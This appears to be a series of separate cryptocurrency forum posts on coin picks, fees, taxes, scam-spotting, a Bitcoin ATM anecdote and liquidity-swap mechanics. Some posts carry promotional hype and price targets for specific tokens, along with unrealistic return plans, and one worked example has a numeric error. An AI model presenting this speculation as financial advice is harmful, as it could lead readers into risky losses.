Now, it seems like we are entering one of the hottest phases in the bullmarket. With the hopes of high gains, many people here seem to chase specifically pumps or buy into them, while they are already happening. However, this might often end up in you buying high and the chart of that specific coin going down. 

At the same time, people are losing hope on coins like ADA, Link, Algo or Tezos (etc., there are many more) just because they aren't pumping. But ironically, that's exactly what you should be looking for. 

Those are all well established names in the current bullrun and if you researched their fundamentals, you should still believe in them. **Price is one component in evaluating an asset but it doesn't define a good and a bad project.**

Search for well established coins. If they haven't pumped yet, even better. So you will be the one to laugh next time, when the stuff starts to pump and you've been there from the start, just because you knew: That's a solid project, it's not going anywhere in the next 3 months, I should probably buy it.

Don't chase pumps like LRC, or some new memecoins. ***If you read about something here, it's most likely too late******.*** And if you do it, consider it gambling, but invest in those mentioned above.

There are around 4 million people on this sub. I don't know how much each Satoshi will be, if each one of us bought $100 worth of Satoshis at this moment.

 All I know is, be a smart guy and buy your Satoshi before $1 can fetch you 1 satoshi in the future. Satoshi will eat those zeros in the dollar very quickly that you wont even realize. All I can say at this moment is Satoshis are still being sold at a huge discount, buy now and don't regret later for not buying.

It's high time we should think of Satoshis rather than 100 million Satoshis (a Bitcoin).

I've often wondered how much people invest initially into crypto and if it is even worth it to invest small amounts due to high gas fees.
Can you offer any advice to a new trader?

Bonded Finance has been building for well over a year now and its platform is due to release in November.

They   will essentially be the AAVE/Compound for low-mid tier altcoins which   other platforms have not targeted, thus aiming to unlock, aggregate,  and  de-risk up to 50 billion of dormant value into their ecosystem.

Bondeds   Index and platform will allow HUNDREDS of small market cap coin   projects to get their tokens listed on the lending index. Token holders   of the various projects can then deposit their tokens and take out   stable coin loans against their bags, unlocking their assests.

They   have built a complex algorithmic ecosystem around the primary lending   index including features such as USB stable coin, ca. 10% APY for USDC   lenders, bundling of alts in various tiers for loans, and much more.

**No one else is doing this!**

\- Non-anon team

\-   Huge connection to chainlink and will use new tiered LINK oracles when   bundling alts into tiers for loans. LINK tweet in may pumped it to 8   cent!

\- Single stake $BOND on the platform earns interest and liquidation fees.

\- SC Audit by Cyber Unit (Same firm that audited FTX, Elrond &amp; Ukraine National Bank)

\- 13m market cap

\- Profit feedback loop with fee distribution back to holders

\- All unlocks from pre-sale done (no vesting unlocks to worry about)

\- Strong liquidity compared to market cap

\- A big catalyst in November which is perfect timing for the bull run and bullish Q4

\- Chart looks like it wants to explode

\- Rebrand in the works

\- Partnered with PROS, TOMO, GLCH, UNN, MATIC, ROUTE, GTON, DFYN, LINK, STAK &amp; More

\- 400m/1000m Coins in Circ - **Current Price: 0.035$**

\- Target: 500m - 750m Market cap and $BOND to 2$

DYOR AND READ THE MEDIUM.

Hello fellow degens. So I ran a Prophet analysis in R Studio this evening for Eth to see which day of the week, time of the day etc. is best for DCA'ing. I looked at data from 2016 and you can see for yourself.

Typically, the cheapest day to buy is Friday. The cheapest time is 10pm. So that's it - if I DCA every Friday at 10pm, I am giving myself the best chance to get the best price. 

&amp;#x200B;

Disclaimer: I am low-key retarded and bought ICP at is peak. I lost money on Shib and Doge so my T.A. should be treated with extreme caution. Have a nice evening.

I'm doing a bit of traveling around Europe and currently in Ukraine for a few weeks. Strangely none of my cards work here except for one debit card that works only in atms. Despite calling my bank and confirming my travel plans I am stuck withdrawing cash to spend money from the one account. No big deal, the fees are reasonable. 

So I met a guy from Chile who works with a company that makes an app that uses Cardano. We hit it off right away as he was also solo traveling and spoke English. We go out each night and explore the city and enjoy the cheap beers.

Last night we went on another bender. At 3am, while drunk, we walked to a bar that was open all night. I realized I was low on cash and saw a 24 atm. Went over and withdrew $100. It gave me tiny denomination only and gave me a massive stack of bills. I was cracking up as I tried to shove this huge wad into my wallet. Stuck my wallet in my pocket and off we went.

Not more than 2 minutes later I was filled with dread. I realized I didn't have my debit card. In the US and most of Europe the atms give you your card before they give the cash, in Ukraine that is not the case, you have to hit exit. Buzzed and distracted by the mega stack of bills I received, I never hit exit and got my card. I sprinted back to the bank but it was too late. My card was now inside the machine for good.

We kept going that night and I woke up and immediately called the bank that owns the atm. No luck they said, I would have to order a new card. I waited until my bank opened and called them, 3 weeks for a new card to arrive. I was starting to panic.

My Chilean friend went to lunch with me and we went back and forth about ideas for my situation. I said, "hey can I PayPal you some money or something and you can float me some cash" he said PayPal wasn't good but he'd be willing to accept crypto. Just then he said a beautiful sentence, "hey I was thinking about when you were talking about Bitcoin atms the other day, think I might try one out."

My eyes lit up and I immediately searched for a bitcoin atm in the city. 2 minute walk away! Went home, threw some funds into my mobile wallet and off I went.

Easiest process ever. Sent a small test amount to the wallet, scanned the qr code on the machine, got a receipt with my redemption code, grabbed a beer while I waited for the confirmation and withdrew. This machine asked for no information about me. 

Quick and easy. I'm back in business. No having to trust a stranger with PayPal transactions, just simple withdrawal. I'll pick up my new debit card in the next city I'm in.

I saved bitcoin and now bitcoin saved me.

tl;dr left my only working card in an atm in a foreign country and found a bitcoin atm that worked easily.

The coin Chia (XCH) has shot up in the past 2 days from 148-ish to 222 at moment of writing this post. The coin was pretty much dead for a couple months (Chia's name for mining since it's supposed to be "green"). I hold a few of it from farming so I'm happy about it obviously, but I have no idea why it's going up? I believe in the long term prospects of XCH coin but if it's just a pump and dump, I should just dump now while if it's something more fundamental I'd rather hold onto it for longer. 

 I can't find any new articles about it. I'm thinking some institutional investors buying it up ahead of the Bloomberg crypto thing tomorrow or maybe insider trading before the IPO?

Over the last Month the reporting on Scam Coins has significantly increased, maybe its because there are more Scam Coins, maybe people are just more interested, i dont know.

What i do know is that its for a good cause, people upvote it so they and others dont fall for the Scams, that motivates people to look for Scam Coins more and report them here, lets continue the cycle!

F\*\*\* the Scammers and F\*\*\* people that support them to make quick money. If you report Scam Coins you have my upvote 100%!!!

Sorry for my english, it isnt my first language.

(Arbitrary words to reach the freakin 500 word limit, can anyone please change it? Its so annoying, anyway, if you are still reading this have a great day!)

Hello folks,

As i'm getting deeper in crypto i'm having trouble following up all my transactions when using hardware wallets. It gets messy real fast after doing a few transactions during the day at work for example and having to count it all back when i come home. 
I use an android only wallet.
I tried reading my bscscan address transactions but it's quite indigestible, i'd like simple things like 100 usdc &gt; 43 OVR basically.

Do you have tips for that ? 
It's really easy on mainstream exchanges but i mess up my figures on harware wallets....

Thank you

Inspired by a post I saw earlier, where somebody asked what simple things you still dont understand about crypto.

So, before you started actually looking into crypto, back when you knew of Bitcoin etc. but had never looked much further into it than that, what stupid misconceptions did you have? 

Ill go first.

The first time I looked at crypto related subreddits and saw somebody talking about use cases, I was totally confused. No idea what they were talking about.

Up until that point I had assumed that the purpose of all crypto was just to be money that you could use to buy things, but that nobody was really interested in using it to buy things because it was so volatile. 

I thought each crypto currency was essentially identical, and you basically just picked your favourite one like you might do with a sports team. I thought that fans of each coin were really weird for having an affiliation to one of the many identical types of make believe money.

I had no idea that they were all individual projects with full development teams behind them, striving to fulfil a unique purpose and solve unique problems. 

I also probably thought way more stupid stuff, but this is the one I find interesting.

Tell me yours. No judgement, unless youre an idiot.

Hi all,

First off I apologize for the question which I'm sure has been asked around a thousand times here, but couldn't find a decent answer.

So here's my question. I'm from Europe, hence using SEPA transfer, so I found myself pretty bothered with the Binance ban and stuff. I then had to find another way to withdraw, and that's where I need you guys.

The best way I could come up with so far is to swap my gains to XLM on Binance (free) -&gt; Send those coins to Coinbase Pro (I count that as free, bless XLM) -&gt; Sell the XLM for euros (around 50 cents per 100 euros) -&gt; Withdraw with SEPA (15 cents). 

It ends up around 5 euros of fees etc every 1000 euros. Not bad, but of course if there's better I'd like to know about it...

Here's what I already tried so you don't bother with the math :

\- Send USDT to [Crypto.com](https://Crypto.com) (0.8$ via BSC) -&gt; Sell USDT for Euros and withdraw for free. But for some reason [Crypto.com](https://Crypto.com) gives me around 20 euros less than I should every 1000 euros, so I don't know where those fees come from but it's not ideal.  
\- Sending XLM on Nexo and sell it there for Euros. The withdrawal is free but the spread when you sell the crypto is too big for large amounts. If I'm not mistaken, it's around 1%, so 10 euros every 1000 euros.  
\- Doing the same kind of stuff on Gemini. Don't remember the fees but I think it was way higher.

I'm all ears for nice suggestions !

Thanks for those who read me, and my your coins pump.

I have only recently joined the vast world of crypto. I bought a few coins; SHIB; BTT; AION and VET of all these three only SHIB has made some profits thus far so I shifted all my investment to the SHIB coin until yesterday after I read about a guy looking to dump $8b worth of SHIB. Then it dipped and I had no choice but to sell 90% and buy Dodge.

This has now got me wondering if I could be taking advantage of this SHIB dip by trading futures on Binance. Is it possible to make more money trading futures than buying and holding? If so how can I go about make accurate predictions of the price movements and what fundamentals should I know before venturing into futures?

Sorry for the repost. As my original post was taken down. 

Apparently pictures are no longer allowed to be posted in r/cc (not sure why there's still an option to post pictures though)? 

&amp;#x200B;

Anyways, its nice to see the friendly banter between America's two largest cities to see which one will become the center of the crypto industry in the USA!

&amp;#x200B;

https://preview.redd.it/ggegsb7bvmx71.jpg?width=783&amp;format=pjpg&amp;auto=webp&amp;s=6d9b58fa2ae4043d443f903b6adbac2202748956

&amp;#x200B;

What are your thoughts? Do you think NYC or Miami will become the center of the crypto universe in the USA? 

If I were to guess, I would probably guess a Texas city like Huston or Dallas could be come the crypto center. 

Time will tell I suppose.

If you look on [coinmarketcap.com](https://coinmarketcap.com), you see a lot of coins and projects. Which project is legit and which one is not? What kind of information is important to check before investing? Where do I start? These are questions I had when I started to learn more about crypto and blockchain. Before we talk more about what you have to spot in a project, the following question is essential:

**Why do I have to DYOR?**

The answer is easy to answer. Doing your own research makes sure you do not fall for a scam. There are a lot projects out there that are only for your money. We know the examples: MANDO, SQUID, etc. With DYOR, you limit the chance to fall for a scam. 

**What kind of information are important to check in a (new) project?**

*Smart contract code?*

I know a lot of us are not programmers. For this, you can use some online tools like [marketmove.ai](https://marketmove.ai). I found this website and you can actually see the code and the quality of it. Copy the smart contract hash and paste it into this website. It is really easy to use! Please note that this is one of the information to check. I do not depend my DYOR on this website. Even if the smart contract looks legit, it doesn't mean that the project in a whole is legit. 

*Team members?*

Always look for the team members on their website. If they are not listed on the website, it is a red flag. Because legit projects have legit and real people behind it. They will show a picture with a LinkedIn account. They also list where they work and you can verify that.

*Website available?*

All projects/coins have an own website. Also scam coins have an own website. If there is no website, red flag. Even is there is a website, look how the design is. Most scam coin websites are amateurish (grammar errors etc.). 

*Whitepaper available?*

If there is no whitepaper available, big red flag. Whitepapers explain their crypto project. But whitepapers also explain the technical details of their coin. If the technical analysis are not there, red flag again. Most scam coins have a whitepaper. But don't be fooled, the whitepaper are mostly a repetition of what they already said on their homepage. Look for technical details!

*Customer support?*

Legit and real crypto project have people who answer your questions and concerns. If they cannot be reached, a red flag. Also, check social media. They mostly have a Telegram group. If you ask critical question in these groups, are you kicked out the group or do they answer your questions? If you get kicked out of the group, a red flag. 

*Do they make any claims?*

What you often see is that projects claim they have a partnership with Microsoft or another big company. Most of the time, this is not true. They do that to lure people in and to make their crypto project more legit. If they have a partnership with these corporations, these corporations will also endorse that. 

These listed above are the most important (but not all) aspects to consider when DYOR in a project/crypto. You have to look at all these points in conjunction and not standalone. 

The most important aspect is to use your common sense. If it is too good to be true (AKA SQUID game coin), it mostly is! Keep your greed and FOMO level in check and stay with listed coins on for example Coinbase or Binance!

So personally, I'm investing in three different coins (CoinA/CoinB/CoinC), and trying to maintain the ratio of:

50/25/25

Recently, one of them shot up a bit, and the ratio is now more like:

46/21/33

I'm slowly building my investment through gpu mining, and was thinking the way forward would be to continue building coin A and B until the ratios are back where I'd like them, but coin C has performed well. Am I not penalizing coin C for being a good performer? Wouldn't I want more of it, instead of taking a break from buying it until my ratio is rebalanced?

I know this is in the territory of general investment strategy, but considering the volatility of crypto, the traditional wisdom of 'rebalance every quarter' may not be appropriate for crypto assets. What's your strategy?

For regular cointraking and taxes like BTC and ETH I'm very happy with coin dot ink, a tracking website for german tax payers. Besides those major coins it can handle now things like Moons (#JJRM3) and I got a nice overview also on this balances and their possible taxes. 

But since I've discovered Algorand ASA and tinyman, things get a little messed up. I have dozens of kitty- and doggy-airdrops paired with excess transactions for every little micro transaction and so on. For tinyman I use Algorand Wallet, which has a CSV export for every token. But the generated tables are a pain in the ... to read or even track.

So I'm asking for a little help about stategies or tools, to get this cluster f... a little bit more managed. Do you know any webservices that can handle ASA or do you know a clever way to make those CSVs more usefull?

I have seen a lot of dig bick wallets here.. I only have a wallet of around 500 euro, with a mix of coins.   
Sometimes I see a lof of messages poking eyes with the high value.. It is creating a feeling of insecurity. Do you big whales have other investments running? How did you start? Do you have an only ramen diet? Don't have money eating kids? Or just lucky bets only? Some people are just good with finances...  Or have flexibility to risk it all. I just find it hard to believe so many have 100k+ 

My plan is to dip in 100 euro in per month max and target a monthly return of 10%  (=yearly 1.1\^12)  this should give me a 300% return YoY.  If I can manage to upkeep 100 euro/month + 10% montly return it would take me 55 months to get to 100k. If i would have a 5% return every month, it would take me 94 months (or about 8 years). Did you do big whales do it the same way, or did you just YOLO all your assets into crypto. How long did you take to get to 100k (either USD or EUR)

The main reason that I love this technology and the impact its going to have on everything. Blockchain can manage the way our economy works and how organisations are setup. Margin free economy, doing business without a middle men. But it can help me also with building value. Anyway, ADHD meds are coming. Thank you for reading.

To start, I'm not one of those Shiba believers.  It's another opportunity, but that's it.  I am more of an ALGO guy, tbh.

I have been hearing about Shiba for some time.  I never really considered it because I didn't think lightning could strike twice (Doge blew up and I couldn't see that happening to Shiba).  Then I got an email from Coinbase saying they were now offering Shiba, only Coinbase was telling me (and still is to this day) that Shiba isn't offered on CB.  I know this isn't true, but I get that error.

So I switched to my back-up exchange, Voyager.  I know plenty of people don't like the app, but I had $358 for free in BTC.  I sold my BTC positions and put all of it on Shiba at $0.00000757.

A month later Shiba went up drastically and my $350 turned into $3500.  It's back down a little and I believe it will do what most mainstream Cryptos are doing, up and down highs and lows.  But I will not sell any until I have $10k.  That's my goal.  If it goes to $0 or to $1Mil it's all the same to me.  It was free money anyway.

I don't know if I would have gotten into Shiba with money I earned through my job.  But I'm glad this all worked out this way.

And if anyone has questions about Voyager, feel free to reach out.

Sometimes it happens that we have to leave behind things, places and situations that have accompanied us for a 'long' time.

It happens that you have to part with a piece of happiness. The change, however necessary, must be celebrated with a depth reflection. Farewells intoxicate but the absent presences intoxicate more. I will miss you what we thought you were, but never were. Nothing lasts forever, I knew that.

I Hope this red chart is just goodbye

Goodbye, my coin

Hey Everyone. 

Lately, i have been seeing a lot of posts on social media about how low a 1000$ investment actually is and that wont make anyone get rich. Perhaps that is right but I want to make a point on how hard it is to invest even 200$ for some people. 

&amp;#x200B;

**First, about me:**

I am a Medicine student in Turkey, Istanbul. I am living in the most expensive city in my country.  I will be writing anything i write in this  $ currency but my family is earning TL, Turkish lira.  

**Few notes:**

* **1 Dollar is equal to 9.73TL** (closed market) as of me writing this text. It is very possible that it will go up.
* **Minimum wage is 290 USD**, though most places do everything they can to pay their employees even less than that. 
*  My all income is from my parents, my personal investments and my monthly credit that government gives. I do not have a job and I have no way to get into one as school is very heavy.
* **My income is 175 USD.** As USD/TRY rate goes up, this will problably be lower in the future aswell.
* All my bills are paid by my family. My monthly expenses, the Four Walls, if I dont do anything fun, is a whopping **102 USD** This leaves me with **73 USD.**
* In all these expenses, nothing unplanned is counted. I calculated this like I am eating  plain Pasta every single day.
* My family said they trust me and they will give me some of their savings so I can invest in Crypto. All this money is a whopping 200 USD.

As you can see, what I have left after a whole month will not even cover up the gas fee for an ETH transaction. 

**Why I want to invest, desperately:**

If you have ever heard about governments money policy here, you will know that they do everything they can do lower interest rates. This shits on our economy, inflation skyrockets, losing value against USD and makes almost everythings base price go up. Government is a shitshow, so no foreign investors aswell. 

All this made me realize: My savings will be useless if I dont do something about it. It is always melting against huge inflation. So, crypto was a lifesaver. I have been mining ETH for a long time aswell, so I have always had my toes dipped in it.  **But it has been so hard because:**

1. There have been months I had to sell Crypto to pay for my basic needs as something urgent came up.
2. Anything i buy, has to go through 6  exchanges if its not avalible in TRY. For example If coin i want to buy is on Kucoin: My Bank--&gt;Binance TR--&gt; TRY-&gt;USDT-&gt;ALGO--&gt;Kucoin--&gt;Buy the coin.  Good amount of money melts in fees or in little amounts of crypto, i pay fees even when i turn them into KCS or BNB. 
3. If i want to do leverage trading, 100 USDT is the least amount of money I need to get in. My whole portfolio other than my mines and locked stakes is 60USDT. 100 USDT would turn my life around right this sec. My only viable option to invest is HODL. For some the best, though my point stands.
4. Diversifying my portfolio means i get super less amounts for every cryptocurrency. I need to consistently find 10x coins before they moon if I want fast returns.
5. If my portfolio goes down for 2 dollars, i lost 1 day worth of meals. Basically, I always have a 10x leverage on any trade i do.
6. Most Crypto related real life stuff, like CRO VISA card, is impossible to get.

There is also 1 positive side which is when i win, i win big. 

All this has made me stop moving to crypto as well as many others I know. This is why adoption will be way hard in countries that have the same difficulties in Crypto.  How about you? Do you have any unique difficulties in crypto?

So hello everyone,

I am here today to try and put out a question that has been around in my mind lately.

I am not a very old member of the sub, but I have noticed that every time that there is a distribution on the sub the price of the coin suddenly goes down a lot. For example, today when I got up I went online and checked that it was on a downward spiral; last month on the distribution days I believe it was completely the same. 

What do you believe is the cause for this? People cashing out massively as they need the money? Or is there another cause that I haven't noticed? 

Thank you for your time :)

We have heard pump &amp; dump. We have people making millions on bitcoin and people losing life savings on bitcoin. The money can't come from nothing. The scams where people buy and than, bum, it crashes and all the value disappears.
My only question is (because I couldn't find a direct answer and don't know a lot): Is your profit somebody's else loss and the other way around?
Logically it doesn't make sense otherwise. So if this is true does this mean cryptocurrencies  are nonsense? Im my opinion kinda. I won't try profiting by trading crypto or finding coins that may jump, because that's gambling. So profiting from trading feels dumb so the only use is to have another option for online payments.
And I was about to forget, MONEY LAUNDERING.

I got into crypto early 2020. Thinking that I knew it was here to stay and that I could profit I bought a bunch of different cryptocurrencies looking to make a quick buck.  
  
Let me tell you something, I was very naive.  
  
I would put $20 in to a crypto and pull out at $30. I was not a HODLer. I was not a whale. I would worry when there was a dip.  
  
Looking back at some of the purchases I made in my account I would have reached my 'target' a long time ago. Some examples of my purchases are below;  
  
I originally bought into ONE at AUD$0.009308 in, it is now worth $0.396338.  
  
Enjin, bought in at $0.104651, now worth $4.162363.  
  
Helium, $2.47 is now $41.15  
  
My biggest regret sale, Axie... purchased at $0.72 and sold at 2.93, a small gain, but one that had I just held, I would have far fewer monetary issues.  
  
  
The aim of this post  is not to regret, but to understand that we are early adopters. More and more companies around the globe are beginning to accept that crypto is here to stay and that is a good thing for us here provided we don't get greedy and sell out for the quick buck.  
  
Since holding and dip DCAing into my far less diverse packet I'm up over 2x which feels nice and means that hopefully my daughter won't have the same financial issues that I did.

Hello, I'm about to receive my Coinbase Card as a european citizen.
Now ive heard that the best way is to convert cash to usdc, but is it even possible to convert eur to usdc? I've been searching for it, but i can't seem to convert my euros into usdc.
Since they're asking a fee (2,5% if i recall correctly) to pay with ETH, i'm not planning on spending ETH.

I've read that you can get cashbacks in Stellar, 4%, which seems really awesome! Or 1% BTC but idk why would anyone pick this one?

TLDR; what is the best way to use my Coinbase card as a European using euros as my fiat currency?

Thanks in advance for any feedback!

Just curious what y'all see for stablecoin risks. Obviously, lets ignore Tether...that looks like a house of cards ready to fall. The returns on stablecoin staking/holding on exchanges obviously indicate there is risk, but it is really hard to quantify or measure. This is what I have come up with. What is missing?

1. Exchange risk. Exchange gets hacked/shutdown. I do not see this as high risk if you are using a reputable exchange. Most reputable exchanges even have insurance policies for this. So I rate this as low.
2. Stablecoin backing. If you stick with 1:1 fiat and currency equivalents (e.g. USDC, GUSD, PAX, BUSD, etc.) where is the risk? The bank holding the assets goes under? Other than the stablecoin lying about what it is backed by and not having audits (looking at you Tether), what else do you worry about? Rating this as lower risk if stablecoin is backed by fiat and fiat equivalents (e.g. treasuries, CD's, etc).
3. Liquidity risk. If a big dog goes down (e.g. Tether), trust is lost and causes a run on all stablecoins (essentially a stablecoin bank run) and they cannot convert their coin to fiat in a quickly enough, coin value falls. Risk? Medium or High possibly.
4. Exchange lending and not managing risk profiles well and have losses to pass on to stablecoin holders. This would basically be the end of the exchange that had to share losses to stablecoin holders, trust would be lost. Risk? Low.

These are just risks I have thought about when holding some funds in stablecoin instead of a bank. What is missing?

This is a first. In a class action lawsuit in Connecticut, a jury found that crypto is not a security. Unhappy investors sued for securities fraud related to cryptocurrency products. With their decision that those investments were not securities, jurors ruled that no securities fraud could have been committed. 

This obviously runs directly contrary to rulings by judges in other fraud cases related to crypto, and runs counter to the position of the SEC. When the people decide, they get to the right answer!

I have purchased some Floki Inu on pancake swap and keeping it in a metamask wallet. I am concerned that I have purchased a fake coin but don't know how to confirm if I really have bought Floki Inu. My reasons for concern are:
1. The wallet does not show the Floki Inu icon
2. Sometimes I open metamask and the balance is down at $5, I restart the app and it's back up to $70

Is number 2 a bug with metamask?
How can I confirm that the balance I have is Floki Inu and not some fake? 

I assume I need to check the address that my Floki wallet is connected with. After some searching I want able to find that information.

Sorry if this is a really basic question, or feels quite advanced to me

# What is Brave?

 Brave is a free and open-source web browser developed by Brave Software, Inc. based on the Chromium web browser, which Chrome is based on as well. Brave is a privacy-focused browser, which automatically blocks online advertisements and website trackers in its default settings. It also provides users the choice to turn on optional ads that pay users for their attention in the form of Basic Attention Tokens (BAT) cryptocurrency. 

# Why should you use it?

With the recent news about google ads scam, there should be a way to prevent that! ( [Link](https://www.engadget.com/crypto-scammers-google-ads-phishing-campaign-100044007.html?guccounter=1&amp;guce_referrer=aHR0cHM6Ly93d3cucmVkZGl0LmNvbS8&amp;guce_referrer_sig=AQAAAH8QRuUp6fzKWfTCYHSRqDmb1-TZHZ9qi3wBZc3fTJ5TM2I07i4FIaPE3FqNJJLStdDZoi_BOHzQKaDR64xJ8BMqUlIeQ8u9c1rNUbn5zS2a21ldY2LtHMHx8_IdYcTjIEgKE9XDWlf0L01tK9cHoc55N5gzcjz99AXKwThhhLQy) about these scams for those interested!) What better way to do that then to use browser that has ad blocker integrated! When using brave you don't get any kind of ads, even ads from websites are blocked and that is unbelievable! That changed my web surfing experience for better 100%, no one wants to see that irritating ads (especially when watching porn)!

&amp;#x200B;

With Brave you can opt in or out of receiving ads by push notifications. When opted in, you receive ads based on how frequent you choose to receive them. But that is not all, when receiving that ads you get payed for clicking on them!  You get rewarded in BAT token which are stored in your browser wallet. When you opt out of ads program you do not receive any kind of ads but you also miss out on those juicy rewards that you can get for free just by receiving ads that you would receive one way or another when not using Brave!

&amp;#x200B;

# Conclusion

When using Brave you don't expose yourself from being scammed out of your crypto with ads! We can all agree that we don't like seeing ads as they are everywhere and they ruin your browsing experience. No more unwanted ads while browsing when using Brave. When I started using Brave I was suspicous about it but oh boy did it improve my browsing experience!

&amp;#x200B;

Don't let yourself being a victim of crypto scam just because you didn't want change!

&amp;#x200B;

Good luck to all and happy Moonvember!

I'm always looking for projects that solve a real pain point as opposed to solutions looking for problems. The world of clinical trials suffers from many costs associated with the book keeping challenges inherent to sensitive medical data being transfered amongst many parties throughout the clinical trials process. 

Triall is a simple clinical trials ecosystem solution company that already has their system in use for a Covid-19 clinical trial with more in the works. And their token TRL is having a massive pump today, but is straight up over position 4000 on CMC, still a huge ways to go.

I am new to this Crypto world. But apparently after doing some research on the Shiba Inu big drop today, I learn few things that applies to Crypto in general. A key information is to look at how the total amount of coin is distributed among all the wallets.  So Shib #1 investor (a whale) owns a whooping 41% of all Shiba coins , the #2 biggest owner owns  70 *trillion* coins  (12.74 % ). So among the zillion information out there, I never got this information until now. If I knew, I would have been very suspicious right from the beginning. (by the way I did not invest in Shib)  
You know, by now that the #2 Shib investor has moved about  40 trillion coins away (worth around 5 billion) in various wallet which is causing the panic.  


Now regarding the Bitcoin that seems less volatile,  
I heard some research found that only 2000 address  own 40% of all Bitcoin... and that scenario  does not seems to be so different from what I just described with the Shib, although Bitcoin is older, way more established and entrenched in a more long term strategy...  


Please correct me if there s something wrong in my reasoning... or if I missed on something..  I would love to hear you opinion in general...

If you're anything like me, you've looked at ways to get some passive gains with your crypto and came across Binance Liquidity Swap. Intrigued and some Google Fu later you're left in the awkward spot of thinking you understand the rough concept, but don't actually understand it well enough to explain in simple terms.

While I wouldn't claim I'm a master at grasping the concept, I feel I'm confident enough that I managed to simplify it enough to the point it actually makes sense. And seeing as how I never encountered a resource that managed to explain it super simple, I figured I may as well share my thoughts in the hopes of helping others. So, here's what I got out of it:

The funny part is, the concept is actually incredibly simple and should be VERY familiar to you already. The quick and dirty is this: when participating in a liquidity swap, you're basically automatically taking profits and/or buying dips. This is the single most important part to grasp, as this is basically THE risk/catch and the source for most of the confusion.

Let's take the most familiar example: BTC/USD. Before you comment: yes, I know Binance doesn't actually offer this pair, but it's the easiest way to explain the concept, so bear with me.

Before we dive in further, let's quickly go over the basics. If we put 100 USD worth of tokens in a BTC/USD liquidity swap, we effectively get 2 bags: 50% is used for BTC and 50% for USD. If we assume 1 BTC is 50 USD, we now have 1 BTC and 50 USD in our swap portfolio. Now, whenever the price moves, so will the number of tokens you hold. The reason is simple: the market always strives for perfect balance, so it wants 50% in BTC and 50% in USD. So, if the price of BTC doubled, the market automatically sells enough BTC to get a 50/50 split.

Let's do the math here and you'll start to understand what happens.

* Portfolio start: 1 BTC (worth 50 USD) &amp; 50 USD. Total worth: 100 USD.
* BTC price doubles to 100 USD. Portfolio is now: 1 BTC (worth 100 USD) &amp; 50 USD. Total worth: 150 USD.
* System rebalances our portfolio to a 50/50 split. 150 divided by 2 = 75 USD for each token.
* New portfolio: 0.75 BTC (worth 75 USD) and 75 USD. Total worth: 150 USD.

The good news: your portfolio is worth 50% more! The perceptive among you will notice that's precisely half of the price movement (100% gain over 50% of your portfolio after all). So what's the catch? Well, if you used that full 100 USD on bitcoin and just HODLed, you would have 2 BTC worth 200 USD. This effect is magnified the more fluctations there are. 

For example, if the price increased five times by 10 USD each time (instead of 50 USD in 1 go), the numbers are as follows (HODL value simply multiplies the current price by 2 BTC):

* Portfolio start; BTC = 50 USD: 1 BTC &amp; 50 USD. Total value: 100 USD. HODL value: 100 USD.
* BTC = 60 USD. Portfolio: \~0.92 BTC &amp; 55 USD. Total value: 110 USD. HODL value: 120 USD (+10).
* BTC = 70 USD. Portfolio: \~0.85 BTC &amp; \~59.58 USD. Total value: 119.17 USD. HODL VALUE: 140 USD (+20.83).
* BTC = 80 USD. Portfolio: \~0.8 BTC &amp; 63.84 USD. Total value: 127.68 USD. HODL VALUE: 160 USD (+32.32).
* BTC = 90 USD. Portfolio: \~0.75 BTC &amp; 67.83 USD. Total value: 135.66 USD. HODL VALUE: 180 USD (+44.34).
* BTC = 100 USD. Portfolio: \~0.72 BTC &amp; 71.60 USD. Total value: 143.20 USD. HODL VALUE: 2000 USD (+56.80).

As you can see, despite the same final price, our portfolio is actually worth less when it took more steps. So why even bother with liquidity swaps? Well, just as you take 50% less profit, you also take 50% less on losses. In fact, the more price moves back and forth, the more advantageous it is to liquidity swaps.

However, price changes isn't the only form of income. Liquidity swaps also give you passive income through swap fees. The more trading volume there is, the better your fee income. The income from fees can thus compensate your losses/limited gains. Keep in mind that the fee % is different for every pairing, so not all pairs are created equally.

So to quickly summarize: the main advantage of Liquidity Swap is that you're betting on 2 horses instead of just 1. This way you are only ever 50% exposed to price movements: a 50% gain would only net you 25%, but a 50% loss will only cost you 25%. This is an advantage during price drops and a small nuisance during price gains. At the same time, Liquidity Swaps are at their best with pairings where price moves back and forth constantly: not only will you constantly increase your position by buying &amp; selling, but the trading volume will net you good returns through fees as well (provided the fee % is good).

The advantages:

* Passive income through fees (based on trading volume)
* Limited exposure to losses
* Great for pairings where price moves back and forth often

The disadvantages:

* Limited exposure to price gains
* Not great for pairings where price hardly moves

I've been big on ADA since around 2017 and in light of Plutus smart contracts, projects im interested in buying haven't gone live yet where I'll be able to take advantage of them before the bear market begins.

I'm looking to take advantage of other projects that haven't crossed my radar yet, so what is everyone favourite project/sleeping giant project that you feel will preform this cycle? Preferably projects with legitimate teams, tokenomics and roadmaps. 

SOL has caught my eye but im afraid im a little too late to the party and at its given price wont be able to accumulate enough quantity to make it worth my while. 

On the flip side I was debating taking a shot at SHIB as the price corrected a bit but ultimately would prefer to stick with project that are memecoins

So far im holding BTC, ADA, ERG, VET, VTHO, CHZ.

Any guidance would be really appreciated!

Thanks everyone

Hello guys First of all, I apologize for my bad English. I'm training on this, but I don't want to wait any longer. I'm translating all of what I'm going to write with google translate. I generally understand what you write, but my vocabulary is very low. This post might be a little long. I hope you don't get bored reading it. I believe it will be worth your read.  

**Who am I?**   
I do not want to put my identity forward on religion, nationality or any other subject before you. I don't think this is true. That's why I will not reveal the country I live in, my nationality, my identity and my religion. I'm in a country famous for people living under $400 a month, Conservative, trying to ban cryptocurrencies, and citizens who don't know what democracy is. I don't reveal my identity so it might be a little dangerous. I'm a software developer making over $400. 

**Why am I here?**   
Ever since I was born, I have always seen living things suffer. People, trees, animals are always in pain. Maybe you can't find it in the countries you live in. I come across it all the time and it makes me very sad. People are hungry, thirsty and homeless. Animals are slaughtered, left unattended, and extinct. Trees are cut down, new ones are not planted. Our world is a terrible place. I feed and help animals as much as I can, but my strength is too little for that. I want to change this. I have been studying bitcoin and blockchain since 2017. Satoshi nakamoto showed us the way. He did a great job but I think it's a bit lacking. I want to make up for this shortcoming. In 2018, I developed an idea. There are still missing fields. I reached out to many businessmen in order to find a source for this idea. They all thought only of money. They didn't want to help people. I've been starting over for years. I always revised the codes I wrote. But now I'm sure I can't do it alone. I am calling out to you now. 

 **What do I want from you?**   
I'm sure there are good-hearted software developers here who will hear my voice and not be unresponsive. We see every day that people are constantly spending time in the stock markets with the greed of making money. Even meme coins that make it clear that they don't work can find billion-dollar volumes. Why not use it for good? I think we owe this to all living things and the world. Let's get together and issue a coin. 

 Let it work with POS, not POW. Be energy efficient Since the mining cost is low, everyone can obtain it and it becomes widespread.  

